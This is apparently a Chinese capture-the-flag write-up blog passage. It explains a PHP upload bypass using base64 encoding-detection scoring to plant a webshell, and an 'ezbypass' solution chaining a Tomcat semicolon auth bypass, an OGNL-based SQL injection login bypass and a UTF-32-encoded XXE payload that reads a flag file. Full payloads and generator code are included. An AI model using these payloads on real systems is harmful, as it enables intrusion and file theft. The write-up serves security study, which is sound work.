<h4 id="libmbfl打分"><a href="#libmbfl打分" class="headerlink" title="libmbfl打分"></a>libmbfl打分</h4><blockquote>
<p>所以实现&#96;&#96;$charset &#x3D;&#x3D; BASE64&#96;，只要文件内容前面数据让它识别为base64即可</p>
<p>那么如何让其认为是base64呢？</p>
<p>这就涉及到<code>libmbfl</code>的打分，<code>libmbfl</code>是<code>mb</code>扩展</p>
<p><code>https://github.com/php/php-src/blob/master/ext/mbstring/libmbfl/mbfl/mbfilter.c#L225</code></p>
<p>我的理解就是类似像<code>checkengine</code>，比如<code>mb_detect_encoding()</code>这类的函数对内容进行编码的识别，就是<code>匹配内容中的一些符合编码的字符，匹配成功对应编码加分</code>，最后从头到尾匹配完成后，<code>打分最高的编码就被认为是该内容的编码</code></p>
</blockquote>
<p>这是打分判断</p>
<blockquote>
<p>0xFFFF是-1，&gt;&#x3D;0 </p>
<blockquote>
<p>0x21是33 33对应!</p>
<p>0x2F是47 47对应&#x2F;</p>
<p><code>47&gt;=c&gt;=33</code></p>
</blockquote>
<p><code>/</code>打分打的多，所以可以在一句话🐎前加入许多<code>/</code></p>
</blockquote>
<p><img src="/2022/06/26/Game-wp/image-20230122195735469.png" alt="image-20230122195735469"></p>
<p>这是<code>mb_encoding_detect()</code>返回判断得到编码类型的逻辑</p>
<blockquote>
<p>因为<code>mb_detect_order([&quot;BASE64&quot;,&quot;ASCII&quot;,&quot;UTF-8&quot;]);</code>，所以按照得分匹配，如果是想要返回<code>base64</code>，就需要内容中<code>base64</code>得分最高，才可以实现返回为<code>base64</code></p>
</blockquote>
<p><img src="/2022/06/26/Game-wp/image-20230122195835984.png" alt="image-20230122195835984"></p>
<h3 id="综上"><a href="#综上" class="headerlink" title="综上"></a><strong>综上</strong></h3><blockquote>
<p>上传的文件需要满足</p>
<p>1.后缀不能为<code>.php</code>等，可以为大小写混写或者纯大写，如<code>.pHp，.PHP</code>等等</p>
<p>2.文件内容前面需要可以被识别为<code>base64</code>，而后面的过滤的内容其实就不用考虑了，因为在判断前经过</p>
<p><code>$content=base64_decode($content)</code></p>
<p><img src="/2022/06/26/Game-wp/image-20230122213729640.png" alt="image-20230122213729640"></p>
<p>可以发现原来的内容在被解码后，发生了变化，结果转化为乱码，于是绕过了黑名单过滤</p>
<p>【当然前提是<code>$charset == BASE64</code>，也就是打分够了】</p>
</blockquote>
<p>于是最后的文件内容为</p>
<p><img src="/2022/06/26/Game-wp/image-20230122210900608.png" alt="image-20230122210900608"></p>
<p>访问<code>1.PHP</code></p>
<p><img src="/2022/06/26/Game-wp/image-20230122210957493.png" alt="image-20230122210957493"></p>
<p>拿蚁剑连接</p>
<p><img src="/2022/06/26/Game-wp/image-20230122164102078.png" alt="image-20230122164102078"></p>
<p>最后得到<code>flag</code></p>
<p><img src="/2022/06/26/Game-wp/image-20230122164115830.png" alt="image-20230122164115830"></p>
<h2 id="ezruoyi"><a href="#ezruoyi" class="headerlink" title="ezruoyi"></a>ezruoyi</h2><blockquote>
<p>hint:<code>RuoYi v4.7.5</code></p>
</blockquote>
<blockquote>
<p>附件：</p>
<p><code>https://drive.google.com/file/d/1vd8-tzGCX5Nra2vNTvJerjyW4KQDaAtE/view?usp=sharing</code></p>
<p>or</p>
<p><code>https://share.weiyun.com/wCvo3QJ0</code></p>
</blockquote>
<hr>
<p>可能有人搭建<code>docker</code>时会发生</p>
<p><img src="/2022/06/26/Game-wp/image-20230122215310097.png" alt="image-20230122215310097"></p>
<p>只需添加<code>version: &quot;3&quot;</code>到您的<code>docker-compose.yml</code>最前面就可以解决报错</p>
<p><img src="/2022/06/26/Game-wp/image-20230122215530660.png" alt="image-20230122215530660"></p>
<p><img src="/2022/06/26/Game-wp/image-20230122215520345.png" alt="image-20230122215520345"></p>
<p>后面环境类似</p>
<p>【这个题目的db镜像一直有问题，那我就看其他大佬的<code>wp</code>，总结一下知识点</p>
<hr>
<h2 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h2><blockquote>
<p>hint:xxe me,尝试编码绕过 xxe 过滤器</p>
</blockquote>
<p><img src="/2022/06/26/Game-wp/image-20230123144129416.png" alt="image-20230123144129416"></p>
<p>这是一道xxe的题目，对内容进行了过滤，可以对过滤内容进行编码绕过过滤达到文件内容读取的目的</p>
<p>反汇编jar包，</p>
<p>在<code>com.example.demo.filter.MyFilter</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (isWhite(request) || auth()) &#123;</span><br><span class="line">      chain.doFilter(request, response);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      response.getWriter().write(<span class="string">&quot;auth fail&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isWhite</span><span class="params">(ServletRequest req)</span> &#123;</span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest)req;</span><br><span class="line">    <span class="keyword">if</span> (request.getRequestURI().endsWith(<span class="string">&quot;.ico&quot;</span>))</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">auth</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里看到开始页面的<code>auth fail</code>的触发条件</p>
<p><code>if (isWhite(request) || auth())</code></p>
<p>其中</p>
<p><code>auth()</code>是一定返回<code>false</code></p>
<p>所以我们需要让<code>isWhite(request)</code>返回<code>true</code>，才能继续后续步骤</p>
<p>在isWhite()中可知</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (request.getRequestURI().endsWith(<span class="string">&quot;.ico&quot;</span>))</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line"> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要<code>URI</code>后以<code>ico</code>结尾，但是又不能访问一个不存在的文件，不然后面的访问都是失败的</p>
<p>这里就需要利用一个知识点</p>
<p><code>Tomcat 以;一种奇怪的方式进行规范化</code></p>
<p>也就是说在<code>;</code>后的不进行解析</p>
<p>于是构造出</p>
<p><code>http://127.0.0.1:8899/index;123.ico</code></p>
<p><img src="/2022/06/26/Game-wp/image-20230123151457117.png" alt="image-20230123151457117"></p>
<p>虽然显示<code>500</code>，但其实是成功了的</p>
</blockquote>
<p>然后就需要考虑如何进行<code>xxe</code>注入</p>
<p>在<code>com.example.demo.controller.DemoController</code>中，正好有个名为<code>xxe</code>的函数</p>
<p><img src="/2022/06/26/Game-wp/image-20230123153904078.png" alt="image-20230123153904078"></p>
<p>在<code>xxe</code>函数上面还有个<code>sayHello</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (password.length() &gt; <span class="number">50</span> || password.indexOf(<span class="string">&quot;&#x27;&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">     System.out.println(<span class="string">&quot;not allow&quot;</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;not allow&quot;</span>;</span><br><span class="line">   &#125; </span><br></pre></td></tr></table></figure>

<blockquote>
<p>发现其对<code>password</code>这个参数中的数据也进行了过滤，长度<code>不能超过50</code>个字符，且其中不能有单引号<code>&#39;</code></p>
<p>否则就会失败返回</p>
</blockquote>
<blockquote>
<p>并且在<code>sayHello</code>函数中，还有其他三个参数</p>
<p><code>String poc, String type, String yourclasses</code></p>
<p>这三个参数也是最后传入<code>xxe函数</code>的三个参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> xxe(poc, type, classes);</span><br></pre></td></tr></table></figure>

<p>【但是<code>yourclasses</code>参数被进行了分割，以<code>,</code>为分割，分成4份</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] classes = yourclasses.split(<span class="string">&quot;,&quot;</span>, <span class="number">4</span>);</span><br></pre></td></tr></table></figure>

<p>所以对<code>yourclasses</code>的参数赋值需要考虑</p>
</blockquote>
<blockquote>
<p>&#x3D;&#x3D;&gt;<code>xxe注入</code>需要四个参数</p>
<p><code>String password, String poc, String type, String yourclasses</code></p>
<p>其中</p>
<ul>
<li><code>password</code>参数值需要绕过单引号（常识猜测是sql注入，以单引号闭合，用万能密码</li>
<li><code>poc</code>参数值按常理应该就是xxe注入的内容</li>
<li><code>type</code>参数值还不太确定</li>
<li><code>yourclasses</code>参数值以<code>,</code>分割为4份，具体值可能就是帮助<code>poc</code>进行绕过过滤的</li>
</ul>
</blockquote>
<p>同样在该类中，底下就是过滤黑名单</p>
<p><img src="/2022/06/26/Game-wp/image-20230123154032645.png" alt="image-20230123154032645"></p>
<blockquote>
<p>可以看到将<code>!DOCTYPE</code>进行了过滤</p>
</blockquote>
<h3 id="password参数"><a href="#password参数" class="headerlink" title="password参数"></a>password参数</h3><p>查找password参数在哪里被利用时</p>
<p>在<code>com.example.demo.mapper.UserProvider</code></p>
<p><img src="/2022/06/26/Game-wp/image-20230124131633821.png" alt="image-20230124131633821"></p>
<p>发现其果然被<code>sql</code>查询利用 ，以<code>&#39;)</code>闭合</p>
<p>但是单引号被过滤了如何闭合，然后实现万能密码呢</p>
<h4 id="Ognl-注入绕过引用过滤"><a href="#Ognl-注入绕过引用过滤" class="headerlink" title="Ognl 注入绕过引用过滤"></a>Ognl 注入绕过引用过滤</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="meta">@java</span>.lang.Character<span class="meta">@toString(39)</span>&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>简而言之，<code>mybatis</code>会调用<code>OGNL parser</code>来解析<code>sql</code>语句中以 <code>$&#123;&#125;</code> 或者 <code>#&#123;&#125;</code> 中的表达式并将执行结果替换进去</p>
</blockquote>
<p>这里的<code>39</code>就是单引号的<code>ascii</code>编码</p>
<p>于是构造<code>sql</code>注入万能密码</p>
<blockquote>
<p><code>password=1</code><strong><code>$&#123;@java.lang.Character@toString(39)&#125;</code></strong><code>) or 1=1#</code></p>
</blockquote>
<h3 id="poc参数"><a href="#poc参数" class="headerlink" title="poc参数"></a>poc参数</h3><p>先分析一下<code>xxe</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">xxe</span><span class="params">(String b64poc, String type, String[] classes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">byte</span>[] bytepoc = Base64.getDecoder().decode(b64poc);</span><br><span class="line">    <span class="keyword">if</span> (check(bytepoc)) &#123;</span><br><span class="line">      <span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">      <span class="type">DocumentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line">      <span class="type">InputSource</span> <span class="variable">inputSource</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="type">Object</span> <span class="variable">wrappoc</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      Constructor&lt;?&gt; constructor = Class.forName(classes[<span class="number">0</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">1</span>]) &#125;);</span><br><span class="line">      <span class="keyword">if</span> (type.equals(<span class="string">&quot;string&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">stringpoc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bytepoc);</span><br><span class="line">        wrappoc = constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; stringpoc &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wrappoc = constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; bytepoc &#125;);</span><br><span class="line">      &#125; </span><br><span class="line">      inputSource = Class.forName(classes[<span class="number">2</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">3</span>]) &#125;).newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; wrappoc &#125;);</span><br><span class="line">      <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.parse(inputSource);</span><br><span class="line">      <span class="type">NodeList</span> <span class="variable">nodes</span> <span class="operator">=</span> doc.getChildNodes();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nodes.getLength(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nodes.item(i).getNodeType() == <span class="number">1</span>) &#123;</span><br><span class="line">          res = res + nodes.item(i).getTextContent();</span><br><span class="line">          System.out.println(nodes.item(i).getTextContent());</span><br><span class="line">        &#125; </span><br><span class="line">      &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>poc</code>传入后变为<code>b64poc</code></p>
<p>然后<code>b64poc</code>进行<code>base64</code>解码，然后<code>check</code>函数进行过滤<code>!DOCTYPE</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytepoc = Base64.getDecoder().decode(b64poc);</span><br></pre></td></tr></table></figure>

<p>这里就提及一个知识点xxe的编码绕过</p>
<blockquote>
<p>一个 xml 文档不仅可以用 UTF-8 编码，也可以用 UTF-16(两个变体 - BE 和 LE)、UTF-32(四个变体 - BE、LE、2143、3412) 和 EBCDIC 编码。</p>
</blockquote>
<p>而一般过滤都是单字符集过滤，利用上面的编码就可以绕过，而且利用上面方式加码的<code>xml</code>文档仍然可以被正常读取解析，</p>
<p>这里将其进行<code>UTF-16</code>加码，于是构造payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="string">&quot;&lt;!DOCTYPE test [ \n&quot;</span></span><br><span class="line">                + <span class="string">&quot;\t&lt;!ENTITY xxe SYSTEM \&quot;file:///flag\&quot;&gt; \n&quot;</span></span><br><span class="line">                + <span class="string">&quot;]&gt; \n&quot;</span>y</span><br><span class="line">                + <span class="string">&quot;&lt;ttoc&gt;&amp;xxe;&lt;/ttoc&gt;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> <span class="string">&quot;UTF-32&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(body.getBytes(type)));</span><br><span class="line">        System.out.println(<span class="string">&quot;poc=&quot;</span>+poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后得到<code>poc</code>的参数值</p>
<blockquote>
<p><code>poc=AAAAPAAAACEAAABEAAAATwAAAEMAAABUAAAAWQAAAFAAAABFAAAAIAAAAHQAAABlAAAAcwAAAHQAAAAgAAAAWwAAACAAAAAKAAAACQAAADwAAAAhAAAARQAAAE4AAABUAAAASQAAAFQAAABZAAAAIAAAAHgAAAB4AAAAZQAAACAAAABTAAAAWQAAAFMAAABUAAAARQAAAE0AAAAgAAAAIgAAAGYAAABpAAAAbAAAAGUAAAA6AAAALwAAAC8AAAAvAAAAZgAAAGwAAABhAAAAZwAAACIAAAA+AAAAIAAAAAoAAABdAAAAPgAAACAAAAAKAAAAPAAAAHcAAABzAAAAdwAAAD4AAAAmAAAAeAAAAHgAAABlAAAAOwAAADwAAAAvAAAAdwAAAHMAAAB3AAAAPg==</code></p>
<p>但是发送请求包中<code>base64</code>编码，需要对数据再进行<code>url</code>编码，不然类型<code>=</code>或<code>+</code>会被视为<code>url</code>中的参数和空格符号</p>
<p><code>poc=AAAAPAAAACEAAABEAAAATwAAAEMAAABUAAAAWQAAAFAAAABFAAAAIAAAAHQAAABlAAAAcwAAAHQAAAAgAAAAWwAAACAAAAAKAAAACQAAADwAAAAhAAAARQAAAE4AAABUAAAASQAAAFQAAABZAAAAIAAAAHgAAAB4AAAAZQAAACAAAABTAAAAWQAAAFMAAABUAAAARQAAAE0AAAAgAAAAIgAAAGYAAABpAAAAbAAAAGUAAAA6AAAALwAAAC8AAAAvAAAAZgAAAGwAAABhAAAAZwAAACIAAAA%2BAAAAIAAAAAoAAABdAAAAPgAAACAAAAAKAAAAPAAAAHcAAABzAAAAdwAAAD4AAAAmAAAAeAAAAHgAAABlAAAAOwAAADwAAAAvAAAAdwAAAHMAAAB3AAAAPg%3D%3D</code></p>
</blockquote>
<h3 id="type参数"><a href="#type参数" class="headerlink" title="type参数"></a>type参数</h3><p>在<code>xxe</code>函数中，对于<code>type</code>参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (type.equals(<span class="string">&quot;string&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">stringpoc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bytepoc);</span><br><span class="line">        wrappoc = constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; stringpoc &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wrappoc = constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; bytepoc &#125;);</span><br><span class="line">      &#125; </span><br></pre></td></tr></table></figure>

<p>似乎对于结果没什么影响，只是对<code>type</code>参数值为不为<code>string</code>时，对<code>wrappoc</code>值有变化【是<code>byte</code>类型的<code>poc</code>参数值，还是<code>string</code>类型的<code>poc</code>参数值】</p>
<p>但是<code>wrappoc</code>参数对后续结果没用影响，猜测<code>type</code>参数值应该可以顺便填，就按其代码赋值也行</p>
<blockquote>
<p><code>type=string</code></p>
</blockquote>
<h3 id="yourclasses参数"><a href="#yourclasses参数" class="headerlink" title="yourclasses参数"></a>yourclasses参数</h3><p><code>yourclasses</code>参数传入<code>xxe</code>函数时，以<code>classes</code>参数名</p>
<p>前面提到过,<code>yourclasses</code>参数以<code>,</code>为分割，分成四份</p>
<p>前两部分</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;?&gt; constructor = Class.forName(classes[<span class="number">0</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">1</span>]) &#125;);</span><br></pre></td></tr></table></figure>

<p>后两部分</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">inputSource = Class.forName(classes[<span class="number">2</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">3</span>]) &#125;).newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; wrappoc &#125;);</span><br><span class="line">      <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.parse(inputSource);</span><br></pre></td></tr></table></figure>

<p>先分析一下</p>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;?&gt; constructor = Class.forName(classes[<span class="number">0</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">1</span>]) &#125;)</span><br></pre></td></tr></table></figure>

<p><a href="https://www.geeksforgeeks.org/java-lang-class-class-java-set-1/"><strong>java.lang.Class 类</strong></a>的**forName()**方法用于获取具有指定类名的该类的实例。此类名称指定为字符串参数</p>
<p>简而言之，<strong>Class.forName</strong> 方法的作用，就是初始化给定的类。</p>
</blockquote>
<h4 id="classes-0-amp-classes-1"><a href="#classes-0-amp-classes-1" class="headerlink" title="classes[0]&amp;classes[1]"></a>classes[0]&amp;classes[1]</h4><blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;?&gt; constructor = Class.forName(classes[<span class="number">0</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">1</span>]) &#125;);</span><br></pre></td></tr></table></figure>

<p>这段代码使用了反射机制。它首先使用 <code>Class.forName(classes[0])</code> 方法来获取类的 <code>Class</code> 对象。</p>
<p>然后使用 <code>getDeclaredConstructor(new Class[] &#123; Class.forName(classes[1]) &#125;)</code> 方法来获取该类的构造函数。</p>
<p>该方法的参数是一个 <code>Class</code> 数组，表示该构造函数的参数类型。在这里，该构造函数只有一个参数，且其参数的类型是 <code>classes[1]</code> 中所表示的类。最后将获取到的构造函数赋值给 <code>constructor</code> 变量。</p>
<blockquote>
<p>反射机制是 Java 编程语言中一种用于获取类、接口、构造方法、字段、方法等信息的机制。反射机制允许程序在运行时动态地获取、使用、操作类的相关信息。</p>
</blockquote>
</blockquote>
<p><strong>&#x3D;&#x3D;&gt;</strong></p>
<blockquote>
<p><code>classes[0]</code>：</p>
<p>这个是看其他大佬wp清楚了，这里赋值字节数组 <code>java.io.ByteArrayInputStream</code>,然后<code>bytepoc</code>通过<strong>ByteArrayInputStream转换为输入流</strong>，因为其类中有<code>read()</code>可以读取数据</p>
<p><code>classes[1]</code>：</p>
<p>是数组参数数据类型，根据数组参数类型”<code>[B</code>“ 是表示字节数组 (byte array) 的类型名称。</p>
<blockquote>
<p>在 java 中，数组类型的类型名称会在前面加上 “[“ 符号表示，比如<code>[I</code>代表 int 类型的数组类型名称，但是由于string不是基本数据类型，只能用类表示<code>[Ljava.lang.String;</code></p>
</blockquote>
</blockquote>
<p><strong>所以</strong></p>
<blockquote>
<p><code>classes[0]=java.io.ByteArrayInputStream</code></p>
<p><code>classes[1]=[B</code>   (因为<code>bytepoc</code>为<code>byte</code>数据类型，所以这里传入<code>ByteArrayInputStream</code>类中的构造函数的参数类型也声明为<code>byte</code></p>
</blockquote>
<h4 id="classes-2-amp-classes-3"><a href="#classes-2-amp-classes-3" class="headerlink" title="classes[2]&amp;classes[3]"></a>classes[2]&amp;classes[3]</h4><blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">inputSource = Class.forName(classes[<span class="number">2</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">3</span>]) &#125;).newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; wrappoc &#125;);</span><br><span class="line">      <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.parse(inputSource);</span><br></pre></td></tr></table></figure>

<p>这里的<code>inputSource</code>参数是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line">...</span><br><span class="line"><span class="type">InputSource</span> <span class="variable">inputSource</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>



<p>这段代码首先使用 <code>Class.forName(classes[2])</code> 方法来获取第三个参数所表示的类的 <code>Class</code> 对象，在这里是 <code>org.xml.sax.InputSource</code> 类，这个类是 <code>SAX (Simple API for XML)</code> 中用于读取 <code>XML</code> 文档的一个类。</p>
<p>然后使用 <code>getDeclaredConstructor(new Class[] &#123; Class.forName(classes[3]) &#125;)</code> 方法来获取该类的构造函数，在这里是 <code>org.xml.sax.InputSource</code> 类的构造函数，接受一个参数是 <code>classes[3]</code> 所表示的类。</p>
<p>之后使用 <code>newInstance(new Object[] &#123; wrappoc &#125;)</code> 方法来创建一个 <code>org.xml.sax.InputSource</code> 类型的实例，使用参数值为 <code>wrappoc</code> 的构造函数来创建这个实例。</p>
<p>接着使用 <code>builder.parse(inputSource)</code> 方法来解析 <code>inputSource</code> 对象，这里的 <code>builder</code> 是 <code>DocumentBuilder</code> 类型的对象，<code>DocumentBuilder</code> 是 <code>javax.xml.parsers</code> 包中提供的一个类，其作用是创建 <strong>DOM 解析器</strong>，用于<code>解析 XML 文档</code></p>
<p>&#x3D;&#x3D;&gt;</p>
<p><code>inputSource</code>值为恶意xml文件内容</p>
<p><code>doc</code>值为解析恶意xml文件后得到的内容</p>
</blockquote>
<p>在代码还有一段实现打印的代码，这段代码就完成了把<code>doc</code>中解析恶意xml文档后得到的内容，打印输出</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">NodeList</span> <span class="variable">nodes</span> <span class="operator">=</span> doc.getChildNodes();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nodes.getLength(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nodes.item(i).getNodeType() == <span class="number">1</span>) &#123;</span><br><span class="line">          res = res + nodes.item(i).getTextContent();</span><br><span class="line">          System.out.println(nodes.item(i).getTextContent());</span><br><span class="line">        &#125; </span><br></pre></td></tr></table></figure>

<blockquote>
<p>这段代码首先使用 <code>doc.getChildNodes()</code> 方法获取文档中的所有子节点，并将它们存储在 <code>NodeList</code> 对象中。</p>
<p>然后使用一个 <code>for</code> 循环来遍历 <code>NodeList</code> 中的每个子节点。在每次循环中，使用 <code>nodes.item(i)</code> 方法获取当前遍历到的子节点。</p>
<p>之后使用 <code>if</code> 语句来检查当前子节点的类型。如果该类型为<code>1</code> (即元素节点)，则使用 <code>nodes.item(i).getTextContent()</code> 方法获取该元素节点的文本内容并将其加到 <code>res</code> 变量中。然后使用 <code>System.out.println(nodes.item(i).getTextContent())</code> 方法将该文本内容打印到控制台。</p>
<p><strong>总的来说</strong>，这段代码用于遍历文档中所有子节点，并将所有元素节点的文本内容提取出来并存储在 res 变量中，同时将其打印到控制台。</p>
<p>这段代码通过遍历<code>doc</code>中的所有子节点,并将所有元素节点的文本内容获取出来并存储在<code>res</code>变量中,同时将其打印到控制台(这段代码在爬虫领域很常用来提取网页中的文本内容)</p>
</blockquote>
<p><strong>所以</strong></p>
<blockquote>
<p><code>classes[2]=org.xml.sax.InputSource</code></p>
<p>&#x2F;&#x2F;这里为<code>org.xml.sax.InputSource</code>类，用于读取xml文件，将其转化为可解析的xml格式，便于后面进行</p>
<p><code>classes[3]=java.io.InputStream</code>     </p>
<p>&#x2F;&#x2F;<code>java.io.ByteArrayInputStream</code>是<code>java.io.InputStream</code>的子类，但是<code>java.io.ByteArrayInputStream</code>不能直接作为构造函数的参数传入 <code>org.xml.sax.InputSource</code> 类的构造函数,因为<code>org.xml.sax.InputSource</code>和 <code>java.io.InputStream</code> 之间并没有继承关系。</p>
<p>&#x2F;&#x2F;如果<code>classes[3]=java.io.ByteArrayInputStream</code>，会导致程序在执行 <code>newInstance(new Object[] &#123; wrappoc &#125;)</code> 方法时出现异常,因为类型不匹配，</p>
<p>除非<code>ByteArrayInputStream</code>转换为<code>InputStream</code> 类型的对象才能传入 <code>org.xml.sax.InputSource</code> 类的构造函数</p>
</blockquote>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><blockquote>
<p><code>password=1$&#123;@java.lang.Character@toString(39)&#125;) or 1=1#&amp;poc=AAAAPAAAACEAAABEAAAATwAAAEMAAABUAAAAWQAAAFAAAABFAAAAIAAAAHQAAABlAAAAcwAAAHQAAAAgAAAAWwAAACAAAAAKAAAACQAAADwAAAAhAAAARQAAAE4AAABUAAAASQAAAFQAAABZAAAAIAAAAHgAAAB4AAAAZQAAACAAAABTAAAAWQAAAFMAAABUAAAARQAAAE0AAAAgAAAAIgAAAGYAAABpAAAAbAAAAGUAAAA6AAAALwAAAC8AAAAvAAAAZgAAAGwAAABhAAAAZwAAACIAAAA%2BAAAAIAAAAAoAAABdAAAAPgAAACAAAAAKAAAAPAAAAHcAAABzAAAAdwAAAD4AAAAmAAAAeAAAAHgAAABlAAAAOwAAADwAAAAvAAAAdwAAAHMAAAB3AAAAPg%3D%3D&amp;type=&quot;string&quot;&amp;yourclasses=java.io.ByteArrayInputStream,[B,org.xml.sax.InputSource,java.io.InputStream</code></p>
</blockquote>
<p><img src="/2022/06/26/Game-wp/image-20230125004553248.png" alt="image-20230125004553248"></p>
